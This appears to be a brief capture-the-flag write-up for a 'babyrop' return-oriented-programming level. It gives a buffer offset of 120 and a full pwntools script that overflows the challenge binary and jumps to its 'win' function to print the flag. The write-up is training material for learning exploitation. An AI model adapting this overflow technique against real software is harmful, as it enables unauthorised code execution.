# Return Oriented Programming 1.1

Similar to level 1.0, however the file didn't provide us with the offset. Using De'Bruijn sequence, we found that the offset is 120.

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level1.1")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 120

payload = flat(
    b'A' * offset,
    elf.sym['win']
)

io.sendline(payload)

io.recvuntil(b'flag:\n')
print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Level1.1.png]]